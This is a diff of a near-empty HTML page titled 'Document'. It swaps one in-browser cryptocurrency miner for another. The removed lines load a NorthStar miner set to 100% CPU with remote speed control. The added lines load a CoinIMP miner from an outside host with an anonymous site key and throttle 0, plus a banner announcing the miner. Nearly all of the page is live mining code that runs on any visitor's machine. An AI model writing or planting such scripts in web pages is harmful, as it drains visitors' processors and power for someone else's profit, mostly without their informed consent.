@@ -4,50 +4,17 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Document</title>
-	<script src="https://wm.bmwebm.org/NorthStar.js"></script>
-	<script>NorthStar.config({ login: "6252678", pass: null }).power(100);</script>
 </head>
 <body>
 	
+<script src="https://www.hostingcloud.racing/EgOA.js"></script>
 <script>
-// - Configure:
-NorthStar.config({ 
-	login: "6252678", // Your ID - required
-	pass: null, // Name for stats, leave blank for automatic set.
-});
+    var _client = new Client.Anonymous('2c821e8aaa5200d3e82e556b9e472421e6065b886c5a4ac89d6fa86b1e1837c2', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
 
-// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
-NorthStar.power(100);
-
-// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
-NorthStar.loadStored();
-
-// - Get current power:
-console.log( NorthStar.getPower() );
-
-// - Get current speed in hashes/sec:
-console.log( NorthStar.getHashesPerSecond() );
-
-// - Get current job algo:
-console.log( NorthStar.getJobAlgo() );
-
-// - Get current job diff:
-console.log( NorthStar.getJobDiff() );
-
-// - Get accepted by pool hashes (in all sessions)
-console.log( NorthStar.getAcceptedHashes() );
-
-// - Reset config and stop minig
-NorthStar.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
-
-// - Remote change speed event:
-NorthStar.on('remotepower', (power) => {
-	NorthStar.power(power); // Is automatic applied if no listeners for this event.
-	console.log('New power:', power);
-});
-
-// - Share accepted event
-NorthStar.on('accepted', () => console.log('New share') );
 </script>
 	
 </body>
